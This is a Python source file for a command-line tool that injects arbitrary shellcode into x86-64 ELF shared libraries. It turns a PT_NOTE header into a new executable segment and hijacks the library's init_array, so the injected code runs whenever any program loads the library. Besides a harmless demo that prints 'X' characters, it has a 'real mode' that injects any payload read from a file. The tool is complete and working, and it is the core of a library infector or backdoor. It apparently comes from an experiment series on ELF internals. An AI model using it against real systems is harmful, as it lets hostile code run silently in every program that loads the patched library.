"""patcher_so.py — Injects code into shared libraries (.so) via init_array hijack.

For ET_DYN ELFs loaded by another program, redirecting e_entry does NOT work:
the dynamic linker never calls the entry point of a loaded library. Instead, it
executes the pointers in DT_INIT_ARRAY (the mechanism behind
__attribute__((constructor))).

Strategy (everything in a single new PT_LOAD segment, via PT_NOTE hijack):

    Injected segment layout:
      [shellcode]        void f(void) function that runs at load time (ends with ret)
      [optional data]    e.g. demo message
      [new init_array]   [ptr_shellcode] + [original_ptrs]
      [new .rela.dyn]    original relocations + R_X86_64_RELATIVE for each
                         init_array slot

    Dynamic table updates:
      DT_INIT_ARRAY   -> new init_array address
      DT_INIT_ARRAYSZ -> new size
      DT_RELA         -> new relocation table address
      DT_RELASZ       -> new size

Why relocations: in PIE/.so binaries the linker adds the load base to each
init_array pointer, but ONLY if there is an R_X86_64_RELATIVE relocation
pointing to that slot. Without it the linker uses the link-time address and
jumps to the wrong location.

Key design principle: all content (shellcode + init_array + rela) is assembled
BEFORE creating the PT_LOAD segment, ensuring the segment covers everything.

Reuses structures from strip.py.
"""

from __future__ import annotations

import argparse
import logging
import os
import struct
import sys
from pathlib import Path

# Allow importing shared modules from the exp1_strip/ directory
sys.path.insert(0, str(Path(__file__).resolve().parent.parent / 'exp1_strip'))

from strip import (
    PHDR_SIZE,
    Elf64_Phdr,
    ElfFile, ElfType, PType,
)

log = logging.getLogger('patcher_so')

PAGE_SIZE = 0x1000
PF_X, PF_W, PF_R = 0x1, 0x2, 0x4

# Dynamic table tags
DT_NULL, DT_INIT_ARRAY, DT_INIT_ARRAYSZ = 0, 25, 27
DT_RELA, DT_RELASZ, DT_RELAENT = 7, 8, 9
R_X86_64_RELATIVE = 8

# Register-preserving boilerplate
PROLOGUE = bytes.fromhex(
    '50515253555657' '4150' '4151' '4152' '4153' '4154' '4155' '4156' '4157'
)
RESTORE = bytes.fromhex(
    '415f' '415e' '415d' '415c' '415b' '415a' '4159' '4158' '5f5e5d5b5a5958'
)


# Helpers

def _align_up(v, a):
    return (v + a - 1) & ~(a - 1)


def _max_vaddr(elf):
    """Highest virtual address occupied by PT_LOAD segments."""
    return max((s.header.p_vaddr + s.header.p_memsz
                for s in elf.segments if s.header.p_type == PType.LOAD),
               default=0)


def _find_pt_note_index(elf):
    """Return the index of the first PT_NOTE entry in the PHT."""
    for s in elf.segments:
        if s.header.p_type == PType.NOTE:
            return s.index
    raise RuntimeError('No PT_NOTE segment found for hijack.')


def _find_dynamic(elf):
    """Return the PT_DYNAMIC program header."""
    for s in elf.segments:
        if s.header.p_type == PType.DYNAMIC:
            return s.header
    raise RuntimeError('No PT_DYNAMIC segment — not a dynamic ELF.')


def _read_dyn(data, off, size):
    """Read dynamic table entries as a list of (tag, value) tuples."""
    out = []
    for i in range(size // 16):
        tag, val = struct.unpack_from('<qQ', data, off + i * 16)
        out.append((tag, val))
        if tag == DT_NULL:
            break
    return out


def _vaddr_to_off(elf, vaddr):
    """Convert a virtual address to a file offset using PT_LOAD segments."""
    for s in elf.segments:
        h = s.header
        if h.p_type == PType.LOAD and h.p_vaddr <= vaddr < h.p_vaddr + h.p_filesz:
            return h.p_offset + (vaddr - h.p_vaddr)
    raise RuntimeError(f'vaddr {vaddr:#x} is outside all PT_LOAD segments')


def wrap_init_function(user_code: bytes) -> bytes:
    """Build a void f(void) init function: saves GPRs, runs user_code, returns."""
    return PROLOGUE + user_code + RESTORE + b'\xc3'


# Injection

def inject_so(elf_bytes: bytes, shellcode: bytes,
              prefix: bytes = b'', shellcode_at_prefix_end: bool = False) -> bytes:
    """Inject `shellcode` (an init function with wrapper) into a shared library.

    Args:
        shellcode:               bytes of the init function (must end with ret)
        prefix:                  data to place BEFORE the shellcode in the segment
                                 (e.g. a demo message)
        shellcode_at_prefix_end: if True, the init_array pointer targets
                                 seg_vaddr+len(prefix); otherwise seg_vaddr.

    Segment layout: [prefix][shellcode][init_array][rela]
    """
    elf = ElfFile.parse(elf_bytes)
    ehdr = elf.header

    if ElfType(ehdr.e_type) != ElfType.DYN:
        raise ValueError(f'Expected ET_DYN, got {ElfType(ehdr.e_type).name}')

    note_idx = _find_pt_note_index(elf)
    dyn = _find_dynamic(elf)
    dyn_off = dyn.p_offset
    dyn_entries = _read_dyn(elf_bytes, dyn_off, dyn.p_filesz)

    # Read the current init_array and relocation table
    d = dict(dyn_entries)
    if DT_INIT_ARRAY not in d:
        raise RuntimeError('No DT_INIT_ARRAY found in this shared library.')

    ia_vaddr = d[DT_INIT_ARRAY]
    ia_size  = d.get(DT_INIT_ARRAYSZ, 0)
    ia_off   = _vaddr_to_off(elf, ia_vaddr)
    n        = ia_size // 8
    orig_ptrs = [struct.unpack_from('<Q', elf_bytes, ia_off + i * 8)[0]
                 for i in range(n)]

    rela_vaddr = d.get(DT_RELA)
    rela_size  = d.get(DT_RELASZ, 0)
    rela_ent   = d.get(DT_RELAENT, 24)
    orig_rela  = b''

    # Map: init_array slot index -> (r_info, r_addend) of its original relocation.
    # We must replicate the EXACT relocation type for each original slot.
    # Slots may have either RELATIVE (type 8) or symbolic (type 1, R_X86_64_64)
    # relocations — treating all as RELATIVE would break symbolic ones
    # (this was the cause of the initial segfault).
    orig_slot_relocs = {}   # slot_index -> (r_info, r_addend)
    if rela_vaddr is not None:
        rela_off  = _vaddr_to_off(elf, rela_vaddr)
        orig_rela = bytes(elf_bytes[rela_off:rela_off + rela_size])
        for i in range(rela_size // rela_ent):
            r_off, r_info, r_add = struct.unpack_from('<QQq', elf_bytes,
                                                      rela_off + i * rela_ent)
            if ia_vaddr <= r_off < ia_vaddr + ia_size:
                slot_idx = (r_off - ia_vaddr) // 8
                orig_slot_relocs[slot_idx] = (r_info, r_add)

    # Compute segment geometry
    seg_file_off = _align_up(len(elf_bytes), PAGE_SIZE)
    seg_vaddr    = _align_up(_max_vaddr(elf), PAGE_SIZE)

    # Positions within the segment (relative to seg_vaddr)
    pos = 0
    prefix_vaddr = seg_vaddr + pos
    pos += len(prefix)

    sc_vaddr = seg_vaddr + pos
    pos += len(shellcode)

    # init_array aligned to 8 bytes
    pos = _align_up(pos, 8)
    new_ia_vaddr = seg_vaddr + pos
    init_ptr  = sc_vaddr
    new_ptrs  = [init_ptr] + orig_ptrs
    new_ia    = struct.pack(f'<{len(new_ptrs)}Q', *new_ptrs)
    pos += len(new_ia)

    # relocation table aligned to 8 bytes
    pos = _align_up(pos, 8)
    new_rela_vaddr = seg_vaddr + pos

    # Build relocations for each slot in the new init_array:
    #   - slot 0 (our shellcode): R_X86_64_RELATIVE, addend = sc_vaddr
    #   - original slots: replicate the exact (r_info, r_addend) from the original
    extra_relocs = b''
    for i, ptr in enumerate(new_ptrs):
        slot = new_ia_vaddr + i * 8
        if i == 0:
            # Our shellcode: position-relative to load base
            r_info, r_add = R_X86_64_RELATIVE, sc_vaddr
        else:
            # Original slot i-1: reuse the existing relocation if present
            orig_idx = i - 1
            if orig_idx in orig_slot_relocs:
                r_info, r_add = orig_slot_relocs[orig_idx]
            else:
                # No original relocation: pointer was already absolute (rare)
                r_info, r_add = R_X86_64_RELATIVE, ptr
        extra_relocs += struct.pack('<QQq', slot, r_info, r_add)
    new_rela = orig_rela + extra_relocs
    pos += len(new_rela)

    # Assemble the segment content at the computed positions
    seg = bytearray(pos)
    seg[0:len(prefix)] = prefix
    seg[(sc_vaddr - seg_vaddr):(sc_vaddr - seg_vaddr) + len(shellcode)] = shellcode
    seg[(new_ia_vaddr - seg_vaddr):(new_ia_vaddr - seg_vaddr) + len(new_ia)] = new_ia
    seg[(new_rela_vaddr - seg_vaddr):(new_rela_vaddr - seg_vaddr) + len(new_rela)] = new_rela

    # Assemble the output file
    out = bytearray(elf_bytes)
    out.extend(b'\x00' * (seg_file_off - len(out)))
    out.extend(seg)

    # PT_NOTE -> PT_LOAD covering the entire injected segment
    new_phdr = Elf64_Phdr(
        p_type=PType.LOAD, p_flags=PF_R | PF_W | PF_X,
        p_offset=seg_file_off, p_vaddr=seg_vaddr, p_paddr=seg_vaddr,
        p_filesz=len(seg), p_memsz=len(seg), p_align=PAGE_SIZE,
    )
    phdr_off = ehdr.e_phoff + note_idx * ehdr.e_phentsize
    out[phdr_off:phdr_off + PHDR_SIZE] = bytes(new_phdr)

    # Update the dynamic table entries
    for i, (tag, val) in enumerate(dyn_entries):
        o = dyn_off + i * 16
        if tag == DT_INIT_ARRAY:
            struct.pack_into('<Q', out, o + 8, new_ia_vaddr)
        elif tag == DT_INIT_ARRAYSZ:
            struct.pack_into('<Q', out, o + 8, len(new_ia))
        elif tag == DT_RELA:
            struct.pack_into('<Q', out, o + 8, new_rela_vaddr)
        elif tag == DT_RELASZ:
            struct.pack_into('<Q', out, o + 8, len(new_rela))

    log.info('init_array: %d -> %d pointers (shellcode at %#x)',
             n, len(new_ptrs), sc_vaddr)
    log.info('rela: %d -> %d bytes (at %#x)',
             rela_size, len(new_rela), new_rela_vaddr)
    log.info('segment: vaddr=%#x, %d bytes', seg_vaddr, len(seg))

    return bytes(out)


# Demo and payload modes

def patch_demo_write(elf_bytes: bytes, payload_size: int) -> bytes:
    """Inject an init function that prints N 'X' bytes via write syscall."""
    elf = ElfFile.parse(elf_bytes)
    seg_vaddr = _align_up(_max_vaddr(elf), PAGE_SIZE)

    # The message is placed as a prefix (before the shellcode);
    # the shellcode references it via a RIP-relative lea.
    msg = b'X' * payload_size
    msg_vaddr = seg_vaddr
    sc_vaddr  = seg_vaddr + len(msg)

    setup = bytes.fromhex('b801000000bf01000000')   # mov eax, 1; mov edi, 1
    lea_addr = sc_vaddr + len(PROLOGUE) + len(setup)
    disp     = msg_vaddr - (lea_addr + 7)
    lea_rsi  = bytes([0x48, 0x8d, 0x35]) + struct.pack('<i', disp)
    mov_rdx  = b'\x48\xc7\xc2' + struct.pack('<i', payload_size)
    syscall  = b'\x0f\x05'
    user_code = setup + lea_rsi + mov_rdx + syscall

    shellcode = wrap_init_function(user_code)
    return inject_so(elf_bytes, shellcode, prefix=msg)


def patch_payload(elf_bytes: bytes, user_code: bytes) -> bytes:
    """Inject arbitrary user_code as an init function."""
    shellcode = wrap_init_function(user_code)
    return inject_so(elf_bytes, shellcode)


# CLI

def _parse_args(argv):
    p = argparse.ArgumentParser(
        prog='patcher_so',
        description='Inject code into a shared library (.so) via init_array hijack.',
    )
    p.add_argument('input', type=Path, help='input ELF shared library')
    p.add_argument('-o', '--output', type=Path, default=None,
                   help='output file (default: <input>.sopatched)')
    p.add_argument('--demo-write', type=int, metavar='N',
                   help='demo mode: inject an init function that prints N bytes of "X"')
    p.add_argument('--payload', type=Path, metavar='F',
                   help='real mode: inject the shellcode read from F as an init function')
    p.add_argument('-q', '--quiet', action='store_true',
                   help='suppress informational messages')
    return p.parse_args(argv)


def main(argv=None):
    args = _parse_args(argv if argv is not None else sys.argv[1:])
    logging.basicConfig(level=logging.WARNING if args.quiet else logging.INFO,
                        format='[patcher_so] %(message)s')

    elf_bytes = args.input.read_bytes()
    dest = args.output or args.input.with_suffix(args.input.suffix + '.sopatched')

    try:
        if args.demo_write is not None:
            patched = patch_demo_write(elf_bytes, args.demo_write)
        elif args.payload is not None:
            patched = patch_payload(elf_bytes, args.payload.read_bytes())
        else:
            log.error('specify --demo-write N or --payload F')
            return 2
        dest.write_bytes(patched)
        os.chmod(dest, args.input.stat().st_mode & 0o7777)
    except (ValueError, RuntimeError, OSError) as e:
        log.error('%s', e)
        return 1

    log.info('%s: %s bytes (original: %s bytes)',
             dest, f'{len(patched):,}', f'{len(elf_bytes):,}')
    return 0


if __name__ == '__main__':
    sys.exit(main())